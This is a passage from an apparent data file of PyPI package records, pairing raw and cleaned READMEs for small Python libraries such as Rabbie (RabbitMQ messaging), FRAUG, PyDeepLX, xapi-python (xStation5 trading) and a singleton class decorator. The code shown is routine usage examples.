Rabbie is a Python package designed to provide a simple and helpful interface for interacting with AMQP message brokers, with a particular focus on RabbitMQ. This package is perfect for developers who want to build robust, scalable, and fault-tolerant messaging systems in Python without the need for extensive knowledge of AMQP protocol.

Rabbie provides a high-level API for sending and receiving messages using RabbitMQ, allowing developers to focus on their application logic rather than low-level details of AMQP. It includes features such as easy setup of exchanges, queues, and bindings, support for message publishing and consuming, automatic message acknowledgments, and easy handling of message routing.

Rabbie also provides support for various RabbitMQ features such as message persistence, TTL, priority queues, and exclusive queues. It allows developers to configure and fine-tune these features with ease using its simple and intuitive API.


## 🧐 Features    
- Multiple Workers per queue
- Multiple listeners per message broker
- Easy decorator interface
- Decoders to allow for JSON (or other) messages
- Hot reloading (COMING SOON)


## 🛠️ Installation
To install Rabbie, simply run:
```bash
pip install rabbie
```

> *You of course need a message broker instance to connect to when using Rabbie*

## 🧑🏻‍💻 Usage
The basic usage to register Listeners with a few listeners:
```python
from rabbie import consumer

@consumer.listen(queue=""my_queue"", workers=3)
def myfunction():
    print(""I've been messaged!"")

@consumer.listen(queue=""my_other_queue"", workers=1)
def my_other_function():
    print(""I've been messaged again!"")

if __name__ == ""__main__"":
    consumer.start()
```

The method above assumes a localhost rabbie instance with default credentials, to use custom credentials, adapt the code like so:
```python
from rabbie import Consumer

consumer = Consumer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
)

@consumer.listen(queue=""my_queue"", workers=3)
def myfunction():
    print(""I've been messaged!"")

if __name__ == ""__main__"":
    consumer.start()
```

> ℹ️ Each Rabbie worker will be in use the entire time your custom function is running, i.e. if you have 3 workers, they can all process 1 message at a time and will not pick up anymore until the entire process has been complete. *(You can add a prefetch to allow for internal message queues)*

### 🎱 Parameters
Rabbie automatically picks up the parameters your function wants depending on the types of them:
```python
from rabbie import Consumer, Channel, Method, Properties

consumer = Consumer(
    ...
)

@consumer.listen(queue=""my_queue"", workers=3)
def myfunction(body: bytes, channel: Channel, method: Method, properties: Properties):
    print(""I've been messaged!"")

if __name__ == ""__main__"":
    consumer.start()
```

> ℹ️ Any parameters that don't have a defined type, or cannot be mapped will be default provided with the message body

### 🪹 Nested Consumers
If you want to have a more complex tree of consumers, you can use a 'MicroConsumer', this allows you to create your consumers anywhere in your code, which can help for readability and organisation if you have a lot of consumers:

`my_module.py`
```python
from rabbie import MicroConsumer

import my_module

nested_consumer = MicroConsumer()

@nested_consumer.listen(queue=""my_queue"", workers=2)
def my_function():
    print(""Hello from a nested listener!"")
```
`main.py`
```python
from rabbie import Consumer

import my_module

consumer = Consumer(
    ...
)

if __name__ == ""__main__"":
    consumer.add_consumer(my_module.nested_consumer)
    consumer.start()
```
### 💾 Encoders & Decoders
When receiving messages through Rabbie, you have the option to pass a Decoder. This acts as a preliminary step before the data passes into your function. If you received a message like: `{""hello"": ""world""}`, you can use the inbuilt `JSONDecoder` to automatically parse this text into a dictionary:
```python
from rabbie import Consumer, JSONDecoder

consumer = Consumer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
    default_decoder=JSONDecoder()
)

@consumer.listen(queue=""my_queue"", workers=3, decoder=JSONDecoder())
def myfunction():
    print(""I've been messaged!"")

if __name__ == ""__main__"":
    consumer.start()
```

> ℹ️ A Consumer and an individual Listener can take a decoder. The decoder passed into the listener will always take precedence over the consumers decoder.


If you have some more complex messaging system that possibly involves encryption, you can create your own Decoder to implement custom preprocessing like so:
```python
from rabbie import Decoder

class CustomDecoder(Decoder):
    def decode(self, body: bytes):
        return # Your custom logic here

consumer = Consumer(
    ...
    default_decoder=CustomDecoder()
)
```

Encoders work in the exact same way (just to encode outgoing messages rather than decode incoming), however you have a new function `content_type()` to override when encoding the message in a particular fashion, this will be the content type sent in the request, and should reflect the bodies applicatio type. *For example the inbuilt JSONEncoder returns a 'application/json' content type*
```python
from rabbie import Encoder

class CustomEncoder(Encoder):
    def encoder(self, body: bytes):
        return # Your custom logic here

    def content_type(self):
        return ""application/my_type""
```
    
### 🖨️ Producers
Producers allow for a simple way to publish messages to exchanges. A simple example would be like so:
```python
from rabbie import Producer, JSONEncoder

producer = Producer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
)

if __name__ == ""__main__"":
    with producer.connect() as channel:
        channel.publish(""hello world!"", ""my_queue"")
```

Producers also support encoders (same interfaces as decoders, just the opposing side) like so:
```python
from rabbie import Producer, JSONEncoder

from my_encoders import CustomEncoder

producer = Producer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
)

if __name__ == ""__main__"":
    with producer.connect(encoder=JSONEncoder()) as channel:
        channel.publish({""hello"": ""world""}, ""my_queue"", encoder=CustomEncoder())
```
> ℹ️ Notice above two encoders are specified. Any parameters passed in to the `channel.publish()` method will take priority, so `CustomEncoder` will be used. It is sometimes easier to define a default value in `producer.connect()` if you will be publishing a lot of similar messages though.
# TODO
- Hot Reloading (Refresh listeners on file changes) 🔄


## ➤ License
Distributed under the MIT License. See [LICENSE](LICENSE) for more information.
        
        
","
# 🥕 Rabbie 🥕

   



Rabbie is a Python package designed to provide a simple and helpful interface for interacting with AMQP message brokers, with a particular focus on RabbitMQ. This package is perfect for developers who want to build robust, scalable, and fault-tolerant messaging systems in Python without the need for extensive knowledge of AMQP protocol.

Rabbie provides a high-level API for sending and receiving messages using RabbitMQ, allowing developers to focus on their application logic rather than low-level details of AMQP. It includes features such as easy setup of exchanges, queues, and bindings, support for message publishing and consuming, automatic message acknowledgments, and easy handling of message routing.

Rabbie also provides support for various RabbitMQ features such as message persistence, TTL, priority queues, and exclusive queues. It allows developers to configure and fine-tune these features with ease using its simple and intuitive API.


## 🧐 Features    
- Multiple Workers per queue
- Multiple listeners per message broker
- Easy decorator interface
- Decoders to allow for JSON (or other) messages
- Hot reloading (COMING SOON)


## 🛠️ Installation
To install Rabbie, simply run:
```bash
pip install rabbie
```

> *You of course need a message broker instance to connect to when using Rabbie*

## 🧑🏻‍💻 Usage
The basic usage to register Listeners with a few listeners:
```python
from rabbie import consumer

@consumer.listen(queue=""my_queue"", workers=3)
def myfunction():
    print(""I've been messaged!"")

@consumer.listen(queue=""my_other_queue"", workers=1)
def my_other_function():
    print(""I've been messaged again!"")

if __name__ == ""__main__"":
    consumer.start()
```

The method above assumes a localhost rabbie instance with default credentials, to use custom credentials, adapt the code like so:
```python
from rabbie import Consumer

consumer = Consumer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
)

@consumer.listen(queue=""my_queue"", workers=3)
def myfunction():
    print(""I've been messaged!"")

if __name__ == ""__main__"":
    consumer.start()
```

> ℹ️ Each Rabbie worker will be in use the entire time your custom function is running, i.e. if you have 3 workers, they can all process 1 message at a time and will not pick up anymore until the entire process has been complete. *(You can add a prefetch to allow for internal message queues)*

### 🎱 Parameters
Rabbie automatically picks up the parameters your function wants depending on the types of them:
```python
from rabbie import Consumer, Channel, Method, Properties

consumer = Consumer(
    ...
)

@consumer.listen(queue=""my_queue"", workers=3)
def myfunction(body: bytes, channel: Channel, method: Method, properties: Properties):
    print(""I've been messaged!"")

if __name__ == ""__main__"":
    consumer.start()
```

> ℹ️ Any parameters that don't have a defined type, or cannot be mapped will be default provided with the message body

### 🪹 Nested Consumers
If you want to have a more complex tree of consumers, you can use a 'MicroConsumer', this allows you to create your consumers anywhere in your code, which can help for readability and organisation if you have a lot of consumers:

`my_module.py`
```python
from rabbie import MicroConsumer

import my_module

nested_consumer = MicroConsumer()

@nested_consumer.listen(queue=""my_queue"", workers=2)
def my_function():
    print(""Hello from a nested listener!"")
```
`main.py`
```python
from rabbie import Consumer

import my_module

consumer = Consumer(
    ...
)

if __name__ == ""__main__"":
    consumer.add_consumer(my_module.nested_consumer)
    consumer.start()
```
### 💾 Encoders & Decoders
When receiving messages through Rabbie, you have the option to pass a Decoder. This acts as a preliminary step before the data passes into your function. If you received a message like: `{""hello"": ""world""}`, you can use the inbuilt `JSONDecoder` to automatically parse this text into a dictionary:
```python
from rabbie import Consumer, JSONDecoder

consumer = Consumer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
    default_decoder=JSONDecoder()
)

@consumer.listen(queue=""my_queue"", workers=3, decoder=JSONDecoder())
def myfunction():
    print(""I've been messaged!"")

if __name__ == ""__main__"":
    consumer.start()
```

> ℹ️ A Consumer and an individual Listener can take a decoder. The decoder passed into the listener will always take precedence over the consumers decoder.


If you have some more complex messaging system that possibly involves encryption, you can create your own Decoder to implement custom preprocessing like so:
```python
from rabbie import Decoder

class CustomDecoder(Decoder):
    def decode(self, body: bytes):
        return # Your custom logic here

consumer = Consumer(
    ...
    default_decoder=CustomDecoder()
)
```

Encoders work in the exact same way (just to encode outgoing messages rather than decode incoming), however you have a new function `content_type()` to override when encoding the message in a particular fashion, this will be the content type sent in the request, and should reflect the bodies applicatio type. *For example the inbuilt JSONEncoder returns a 'application/json' content type*
```python
from rabbie import Encoder

class CustomEncoder(Encoder):
    def encoder(self, body: bytes):
        return # Your custom logic here

    def content_type(self):
        return ""application/my_type""
```
    
### 🖨️ Producers
Producers allow for a simple way to publish messages to exchanges. A simple example would be like so:
```python
from rabbie import Producer, JSONEncoder

producer = Producer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
)

if __name__ == ""__main__"":
    with producer.connect() as channel:
        channel.publish(""hello world!"", ""my_queue"")
```

Producers also support encoders (same interfaces as decoders, just the opposing side) like so:
```python
from rabbie import Producer, JSONEncoder

from my_encoders import CustomEncoder

producer = Producer(
    host=""localhost"",
    port=5672,
    username=""user"",
    password=""password"",
)

if __name__ == ""__main__"":
    with producer.connect(encoder=JSONEncoder()) as channel:
        channel.publish({""hello"": ""world""}, ""my_queue"", encoder=CustomEncoder())
```
> ℹ️ Notice above two encoders are specified. Any parameters passed in to the `channel.publish()` method will take priority, so `CustomEncoder` will be used. It is sometimes easier to define a default value in `producer.connect()` if you will be publishing a lot of similar messages though.
# TODO
- Hot Reloading (Refresh listeners on file changes) 🔄


## ➤ License
Distributed under the MIT License. See [LICENSE](LICENSE) for more information.
        
        
",scuffi/rabbie
fraug,https://github.com/fraugs/fraug,0,1603,1603,"# FRAUG
The GitHub repository of the **FRAUG** (**F**or **R**ealistic **AUG**mentations)  🐸 library! 

# 🚧 WIP 

## TODO

|Methods|Sub-method|Sub-submethod|Interest of the method|Pseudo-code for French|Pseudo-code for multilingual|Rust|Example|
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
|Lexical substitution|Thesaurus|Dictionary of synonyms| |🟢|🔴|🔴|🔴|
| | |WordNet| |🟢|🔴|🔴|🔴|
| | |Wonef| |🟢|🔴|🔴|🔴|
| |Word embedding|Gensim (Fauconnier)| |🟢|🔴|🔴|🔴|
| | |FastText| |🟢|🔴|🔴|🔴|
| |Masked language model (BERT like)|Random| |🟢|🔴|🔴|🔴|
| | |POS| |🔴|🔴|🔴|🔴|
| |TD-IDF| | |🔴|🔴|🔴|🔴|
|Back-translation|Marian (Helsinki-NLP models)| | |🟢|🔴|🔴|🔴|
| |M2M100| | |🟢|🔴|🔴|🔴|
| |See if other models have appeared since| | |🔴|🔴|🔴|🔴|
|Transformation of the text surface| | | |Not relevant in French, will have to be done for English|🔴|🔴|🔴|
|Random noise injection|Spelling mistakes injection| | |🟢|🔴|🔴|🔴|
| |Typing errors injection| | |🟢|🔴|🔴|🔴|
| |Unigram noise injection| | |🔴|🔴|🔴|🔴|
| |Noise injection| | |🔴|🔴|🔴|🔴|
| |Mixed sentences| | |🔴|🔴|🔴|🔴|
| |Random insertion| | |🟢|🔴|🔴|🔴|
| |Random swap| | |🟢|🔴|🔴|🔴|
| |Random deletion| | |🟢|🔴|🔴|🔴|
|Cross-over augmentation| | | |🔴|🔴|🔴|🔴|
|Manipulating the syntax tree|Time manipulation| | |🟠|🔴|🔴|🔴|
| |Gender manipulation| | |🟠|🔴|🔴|🔴|
| |Number manipulation| | |🟠|🔴|🔴|🔴|
|MixUp|Word Mix Up| | |🔴|🔴|🔴|🔴|
| |Sentence Mix Up| | |🔴|🔴|🔴|🔴|
|Generative methods|Generate paraphrases| | |🟠|🔴|🔴|🔴|
| |Complexification| | |🟠|🔴|🔴|🔴|
|Text simplification|Text summary| | |🟢|🔴|🔴|🔴|
| |Simplification| | |🟠|🔴|🔴|🔴|

---

If you find the project useful, please consider giving it a star ⭐️.
","# FRAUG
The GitHub repository of the **FRAUG** (**F**or **R**ealistic **AUG**mentations)  🐸 library! 

# 🚧 WIP 

## TODO

|Methods|Sub-method|Sub-submethod|Interest of the method|Pseudo-code for French|Pseudo-code for multilingual|Rust|Example|
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
|Lexical substitution|Thesaurus|Dictionary of synonyms| |🟢|🔴|🔴|🔴|
| | |WordNet| |🟢|🔴|🔴|🔴|
| | |Wonef| |🟢|🔴|🔴|🔴|
| |Word embedding|Gensim (Fauconnier)| |🟢|🔴|🔴|🔴|
| | |FastText| |🟢|🔴|🔴|🔴|
| |Masked language model (BERT like)|Random| |🟢|🔴|🔴|🔴|
| | |POS| |🔴|🔴|🔴|🔴|
| |TD-IDF| | |🔴|🔴|🔴|🔴|
|Back-translation|Marian (Helsinki-NLP models)| | |🟢|🔴|🔴|🔴|
| |M2M100| | |🟢|🔴|🔴|🔴|
| |See if other models have appeared since| | |🔴|🔴|🔴|🔴|
|Transformation of the text surface| | | |Not relevant in French, will have to be done for English|🔴|🔴|🔴|
|Random noise injection|Spelling mistakes injection| | |🟢|🔴|🔴|🔴|
| |Typing errors injection| | |🟢|🔴|🔴|🔴|
| |Unigram noise injection| | |🔴|🔴|🔴|🔴|
| |Noise injection| | |🔴|🔴|🔴|🔴|
| |Mixed sentences| | |🔴|🔴|🔴|🔴|
| |Random insertion| | |🟢|🔴|🔴|🔴|
| |Random swap| | |🟢|🔴|🔴|🔴|
| |Random deletion| | |🟢|🔴|🔴|🔴|
|Cross-over augmentation| | | |🔴|🔴|🔴|🔴|
|Manipulating the syntax tree|Time manipulation| | |🟠|🔴|🔴|🔴|
| |Gender manipulation| | |🟠|🔴|🔴|🔴|
| |Number manipulation| | |🟠|🔴|🔴|🔴|
|MixUp|Word Mix Up| | |🔴|🔴|🔴|🔴|
| |Sentence Mix Up| | |🔴|🔴|🔴|🔴|
|Generative methods|Generate paraphrases| | |🟠|🔴|🔴|🔴|
| |Complexification| | |🟠|🔴|🔴|🔴|
|Text simplification|Text summary| | |🟢|🔴|🔴|🔴|
| |Simplification| | |🟠|🔴|🔴|🔴|

---

If you find the project useful, please consider giving it a star ⭐️.
",fraugs/fraug
echo-logger,https://github.com/void-echo/echo_logger/,0,218,218,"# Echo Logger

This is a simple echo logger for informative, warning and error messages.

Time and colored printing are supported.

This repository is mostly for my own use, but feel free to use it if you want.
","# Echo Logger

This is a simple echo logger for informative, warning and error messages.

Time and colored printing are supported.

This repository is mostly for my own use, but feel free to use it if you want.
",void-echo/echo_logger
pydeeplx,https://github.com/OwO-Network/PyDeepLX,2,1356,1204,"# PyDeepLX
A Python package for unlimited DeepL translation

## API Version
[OwO-Network/DeepLX](https://github.com/OwO-Network/DeepLX): Permanently free DeepL API written in Golang.

## Description
This is a Python package translated by DeepL, I didn't limit the number of translations in the code, if there is a `429` error, it means your IP has been blocked by DeepL temporarily, please don't request it frequently in a short time.

## Usage
### Install Package
```bash
pip install PyDeepLX
```
### Use in code
```python
from PyDeepLX import PyDeepLX
# By default, the source language is automatically recognized and translated into English without providing any alternative results.
targetText = PyDeepLX.translate(""你好世界"") # Return String

# Specify the source and target languages
targetText = PyDeepLX.translate(""你好世界"", ""ZH"", ""JP"") # Return String

# Need alternative results
targetText = PyDeepLX.translate(""毫无疑问的"", ""ZH"", ""JP"", True) # Return List: ['Without a doubt', 'No doubt']

# Print the results
targetText = PyDeepLX.translate(""毫无疑问的"", ""ZH"", ""JP"", True, True)
```

## PyPi
<a href=""https://pypi.org/project/PyDeepLX/""><img src=""https://img.shields.io/badge/Pypi-000000?style=for-the-badge&logo=pypi&logoColor=red"" /></a>

## Author

**PyDeepLX** © [Vincent Young](https://github.com/missuo), Released under the [MIT](./LICENSE) License.<br>

","# PyDeepLX
A Python package for unlimited DeepL translation

## API Version
[OwO-Network/DeepLX](https://github.com/OwO-Network/DeepLX): Permanently free DeepL API written in Golang.

## Description
This is a Python package translated by DeepL, I didn't limit the number of translations in the code, if there is a `429` error, it means your IP has been blocked by DeepL temporarily, please don't request it frequently in a short time.

## Usage
### Install Package
```bash
pip install PyDeepLX
```
### Use in code
```python
from PyDeepLX import PyDeepLX
# By default, the source language is automatically recognized and translated into English without providing any alternative results.
targetText = PyDeepLX.translate(""你好世界"") # Return String

# Specify the source and target languages
targetText = PyDeepLX.translate(""你好世界"", ""ZH"", ""JP"") # Return String

# Need alternative results
targetText = PyDeepLX.translate(""毫无疑问的"", ""ZH"", ""JP"", True) # Return List: ['Without a doubt', 'No doubt']

# Print the results
targetText = PyDeepLX.translate(""毫无疑问的"", ""ZH"", ""JP"", True, True)
```

## PyPi


## Author

**PyDeepLX** © [Vincent Young](https://github.com/missuo), Released under the [MIT](./LICENSE) License.
",owo-network/pydeeplx
xapi-python,https://github.com/pawelkn/xapi-python,0,5792,5624,"# xStation5 API Python Library

[![Test xapi-python](https://github.com/pawelkn/xapi-python/actions/workflows/test-xapi-python.yml/badge.svg)](https://github.com/pawelkn/xapi-python/actions/workflows/test-xapi-python.yml) [![PyPi](https://img.shields.io/pypi/v/xapi-python.svg)](https://pypi.python.org/pypi/xapi-python/) [![Downloads](https://img.shields.io/pypi/dm/xapi-python)](https://pypi.python.org/pypi/xapi-python/) [![Codecov](https://codecov.io/gh/pawelkn/xapi-python/branch/master/graph/badge.svg)](https://codecov.io/gh/pawelkn/xapi-python/)

The xStation5 API Python library provides a simple and easy-to-use API for interacting with the xStation5 trading platform. With this library, you can connect to the xStation5 platform, retrieve market data, and execute trades.

This library may be used for [BFB Capital](https://bfb.capital) and [XTB](https://www.xtb.com) xStation5 accounts.

API documentation: <http://developers.xstore.pro/documentation>

## Disclaimer

This xStation5 API Python library is not affiliated with, endorsed by, or in any way officially connected to the xStation5 trading platform or its parent company. The library is provided as-is and is not guaranteed to be suitable for any particular purpose. The use of this library is at your own risk, and the author(s) of this library will not be liable for any damages arising from the use or misuse of this library. Please refer to the license file for more information.

## Installation

You can install xAPI using pip. Simply run the following command:

```shell
pip install xapi-python
```

## Usage

To use xAPI, you will need to have an active account with the xStation5 trading platform. Once you have an account, you can use the xAPI library to connect to the platform and begin trading.

Here is an example of how to use the xAPI library to connect to the xStation5 platform:

```python
import asyncio
import xapi

# Replace these values with your own credentials
CREDENTIALS = {
    ""accountId"": ""<your_client_id>"",
    ""password"": ""<your_password>"",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": True
}

async def main():
    try:
        # Create a new xAPI object and connect to the xStation5 platform
        async with await xapi.connect(**CREDENTIALS) as x:
            pass

    except xapi.LoginFailed as e:
        print(f""Log in failed: {e}"")

    except xapi.ConnectionClosed as e:
        print(f""Connection closed: {e}"")

if __name__ == ""__main__"":
    asyncio.run(main())
```

Once you have connected to the platform, you can use the xAPI object to retrieve market data and execute trades.

Here is an example of how to subscribe to market data using the xAPI library:

```python
import asyncio
import xapi

# Replace these values with your own credentials
CREDENTIALS = {
    ""accountId"": ""<your_client_id>"",
    ""password"": ""<your_password>"",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": True
}

async def main():
    while True:
        try:
            async with await xapi.connect(**CREDENTIALS) as x:
                # Subscribe for the current price of BITCOIN and ETHEREUM
                await x.stream.getTickPrices(""BITCOIN"")
                await x.stream.getTickPrices(""ETHEREUM"")

                # Listen for coming price ticks
                async for message in x.stream.listen():
                    print(message['data'])

        except xapi.LoginFailed as e:
            print(f""Log in failed: {e}"")
            return

        except xapi.ConnectionClosed as e:
            print(f""Connection closed: {e}, reconnecting ..."")
            continue

if __name__ == ""__main__"":
    try:
        asyncio.run(main())

    except KeyboardInterrupt:
        pass
```

And here is an example of how to execute a trade using the xAPI library:

```python
import asyncio
import xapi
from xapi import TradeCmd, TradeType, TradeStatus

# Replace these values with your own credentials
CREDENTIALS = {
    ""accountId"": ""<your_client_id>"",
    ""password"": ""<your_password>"",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": False
}

async def main():
    try:
        async with await xapi.connect(**CREDENTIALS) as x:
            # Open a new trade for BITCOIN
            response = await x.socket.tradeTransaction(
                symbol=""BITCOIN"",
                cmd=TradeCmd.BUY_LIMIT,
                type=TradeType.OPEN,
                price=10.00,
                volume=1
            )

            if response['status'] == True:
                print(""Transaction sent to market"")
            else:
                print(""Failed to trade a transaction"", response)

    except xapi.LoginFailed as e:
        print(f""Log in failed: {e}"")

    except xapi.ConnectionClosed as e:
        print(f""Connection closed: {e}"")

if __name__ == ""__main__"":
    asyncio.run(main())
```

## Examples

To run the examples for the xAPI library, you will need to have an account with the xStation5 trading platform.

Before running the examples, you should create a file called _credentials.json_ in the project directory. This file should contain your account credentials, like this:

### credentials.json

```json
{
    ""accountId"": ""<your_client_id>"",
    ""password"": ""<your_password>"",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": true
}
```

Once you have created the _credentials.json_ file, you can run an example using the following command:

```shell
python3 examples/get-margin-level.py
```

## Unit Tests

This will run all of the unit tests in the tests directory:

```shell
python3 -m unittest discover tests
```

## Buy Me A Coffee! ☕

If you find the project beneficial and would like to support me, please consider showing your appreciation by buying me a coffee on [BuyMeACoffee](https://www.buymeacoffee.com/pawelkn)
","# xStation5 API Python Library

[![Test xapi-python](https://github.com/pawelkn/xapi-python/actions/workflows/test-xapi-python.yml/badge.svg)](https://github.com/pawelkn/xapi-python/actions/workflows/test-xapi-python.yml) [![PyPi](https://img.shields.io/pypi/v/xapi-python.svg)](https://pypi.python.org/pypi/xapi-python/) [![Downloads](https://img.shields.io/pypi/dm/xapi-python)](https://pypi.python.org/pypi/xapi-python/) [![Codecov](https://codecov.io/gh/pawelkn/xapi-python/branch/master/graph/badge.svg)](https://codecov.io/gh/pawelkn/xapi-python/)

The xStation5 API Python library provides a simple and easy-to-use API for interacting with the xStation5 trading platform. With this library, you can connect to the xStation5 platform, retrieve market data, and execute trades.

This library may be used for [BFB Capital](https://bfb.capital) and [XTB](https://www.xtb.com) xStation5 accounts.

API documentation: 

## Disclaimer

This xStation5 API Python library is not affiliated with, endorsed by, or in any way officially connected to the xStation5 trading platform or its parent company. The library is provided as-is and is not guaranteed to be suitable for any particular purpose. The use of this library is at your own risk, and the author(s) of this library will not be liable for any damages arising from the use or misuse of this library. Please refer to the license file for more information.

## Installation

You can install xAPI using pip. Simply run the following command:

```shell
pip install xapi-python
```

## Usage

To use xAPI, you will need to have an active account with the xStation5 trading platform. Once you have an account, you can use the xAPI library to connect to the platform and begin trading.

Here is an example of how to use the xAPI library to connect to the xStation5 platform:

```python
import asyncio
import xapi

# Replace these values with your own credentials
CREDENTIALS = {
    ""accountId"": """",
    ""password"": """",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": True
}

async def main():
    try:
        # Create a new xAPI object and connect to the xStation5 platform
        async with await xapi.connect(**CREDENTIALS) as x:
            pass

    except xapi.LoginFailed as e:
        print(f""Log in failed: {e}"")

    except xapi.ConnectionClosed as e:
        print(f""Connection closed: {e}"")

if __name__ == ""__main__"":
    asyncio.run(main())
```

Once you have connected to the platform, you can use the xAPI object to retrieve market data and execute trades.

Here is an example of how to subscribe to market data using the xAPI library:

```python
import asyncio
import xapi

# Replace these values with your own credentials
CREDENTIALS = {
    ""accountId"": """",
    ""password"": """",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": True
}

async def main():
    while True:
        try:
            async with await xapi.connect(**CREDENTIALS) as x:
                # Subscribe for the current price of BITCOIN and ETHEREUM
                await x.stream.getTickPrices(""BITCOIN"")
                await x.stream.getTickPrices(""ETHEREUM"")

                # Listen for coming price ticks
                async for message in x.stream.listen():
                    print(message['data'])

        except xapi.LoginFailed as e:
            print(f""Log in failed: {e}"")
            return

        except xapi.ConnectionClosed as e:
            print(f""Connection closed: {e}, reconnecting ..."")
            continue

if __name__ == ""__main__"":
    try:
        asyncio.run(main())

    except KeyboardInterrupt:
        pass
```

And here is an example of how to execute a trade using the xAPI library:

```python
import asyncio
import xapi
from xapi import TradeCmd, TradeType, TradeStatus

# Replace these values with your own credentials
CREDENTIALS = {
    ""accountId"": """",
    ""password"": """",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": False
}

async def main():
    try:
        async with await xapi.connect(**CREDENTIALS) as x:
            # Open a new trade for BITCOIN
            response = await x.socket.tradeTransaction(
                symbol=""BITCOIN"",
                cmd=TradeCmd.BUY_LIMIT,
                type=TradeType.OPEN,
                price=10.00,
                volume=1
            )

            if response['status'] == True:
                print(""Transaction sent to market"")
            else:
                print(""Failed to trade a transaction"", response)

    except xapi.LoginFailed as e:
        print(f""Log in failed: {e}"")

    except xapi.ConnectionClosed as e:
        print(f""Connection closed: {e}"")

if __name__ == ""__main__"":
    asyncio.run(main())
```

## Examples

To run the examples for the xAPI library, you will need to have an account with the xStation5 trading platform.

Before running the examples, you should create a file called _credentials.json_ in the project directory. This file should contain your account credentials, like this:

### credentials.json

```json
{
    ""accountId"": """",
    ""password"": """",
    ""host"": ""ws.xtb.com"",
    ""type"": ""real"",
    ""safe"": true
}
```

Once you have created the _credentials.json_ file, you can run an example using the following command:

```shell
python3 examples/get-margin-level.py
```

## Unit Tests

This will run all of the unit tests in the tests directory:

```shell
python3 -m unittest discover tests
```

## Buy Me A Coffee! ☕

If you find the project beneficial and would like to support me, please consider showing your appreciation by buying me a coffee on [BuyMeACoffee](https://www.buymeacoffee.com/pawelkn)
",pawelkn/xapi-python
singleton-class-decorator,https://github.com/Jrmy-rbr/singleton-class-decorator,0,4078,4007,"![coverage_badge](https://img.shields.io/badge/coverage-100%25-brightgreen)

# Installation
## Through GitHub
1. Go to a folder where you want to store the repo: `cd <path_to_folder>`
2. Clone the repo using the following: `git clone git@github.com:Jrmy-rbr/singleton-class-decorator.git`
3. Install using pip: `pip install ./singleton-class-decorator`

## Through PyPI
Run `python -m pip install singleton-class-decorator`
# Singleton Class Decorator

This repo implements a decorator that creates singleton classes. As opposed to some other singleton decorators,
the singleton classes created through this decorator are true classes. As a consequence,
every operation supported by classes is supported by the singleton classes, like the use of instance, or inheritance for example.

The main purpose of this repo was for me to learn more about Python, and some of its more advanced features. But this decorator comes with its advantages. It is not more powerful than for example [this](https://github.com/Kemaweyan/singleton_decorator) commonly used decorator by [Kemaweyan](https://github.com/Kemaweyan). However, it allows using singleton classes as actual classes, and therefore it might be more intuitive to use in situations where Kemayan's singleton object needs to use some extra attribute. Here is a quick illustration of situations in which our decorator behaves differently.

## Quick comparison with Kemayan's decorator
### Kemayan's decorator
```python
@singleton
class MyClass:
    @static
    def add(x, y):
        return x+y

# This will raise an AttributeError
MyClass.add(1, 2)

# You need to do this instead. It'll return 3
MyClass.__wrapped__.add(1, 2)
```

```python
@singleton
class MyClass:
    ...

obj = MyClass()

# this will raise an error
isinstance(obj, MyClass)

# you need to do this instead
isinstance(obj, MyClass.__wrapped__)
```

### This decorator

```python
@singleton
class MyClass:
    @static
    def add(x, y):
        return x+y

# This works fine
MyClass.add(1, 2)
```

```python
@singleton
class MyClass:
    ...

obj = MyClass()

# this works fine
isinstance(obj, MyClass)
```

# Usage


You can import the singleton class decorator as follows:

```python
from singleton_class_decorator import singleton
```

## Simplest use case
Here are some usage examples. To make a singleton class you simply need to use the singleton decorator
on your class as follows:

```python
@singleton
class MyClass:
    ...

# MyClass is now a singleton, which we can check
assert MyClass() is MyClass()

```

As mentioned earlier, you can check the type of an object as with a regular class:

```python
obj = MyClass()

type(obj)
# returns `<class 'singleton_class_decorator.MetaClasses.MyClass'>`

type(obj) == MyClass
# This evaluates to True

isinstance(obj, MyClass)
# This evaluates to True

```

## Enabling Inheritance

The above should work for any class. However, if you try to create a child class from `MyClass` an error will be raised. This is because by default the singleton disables inheritance. 
```python
from singleton_class_decorator import singleton

@singleton
class MyClass:
    ...

# is equivalent to the following

@singleton(is_final=True)
class MyClass:
    ...
```
As you see, the default value of the keyword argument `is_final` is `True`, which disables inheritance. But you can easily change it.

```python
# enable inheritance by setting the ketword argument `is_final` for `False`
@singleton(is_final=False)
class MyClass:
    ...

# This will now work
class ChildClass(MyClass):
    ...

# However the ClidClass is not automatically a singleton
assert ChildClass() is not ChildClass()

# If you want a child class to be a singleton, you need to use the singleton decorator
# Again you may set the `is_final` to `True` or `False` as you whish.
@singleton
class OtherChildClass(MyClass):
    ...

# OtherChildClass is a singleton
assert OtherChildClass() is OtherChildClass()

```

# How Does it work?

Go check my blog post about this decorator [here](https://jrmy-rbr.github.io/2023/02/19/singleton_decorator.html) 
","![coverage_badge](https://img.shields.io/badge/coverage-100%25-brightgreen)

# Installation
## Through GitHub
1. Go to a folder where you want to store the repo: `cd `
2. Clone the repo using the following: `git clone git@github.com:Jrmy-rbr/singleton-class-decorator.git`
3. Install using pip: `pip install ./singleton-class-decorator`

## Through PyPI
Run `python -m pip install singleton-class-decorator`
# Singleton Class Decorator

This repo implements a decorator that creates singleton classes. As opposed to some other singleton decorators,
the singleton classes created through this decorator are true classes. As a consequence,
every operation supported by classes is supported by the singleton classes, like the use of instance, or inheritance for example.

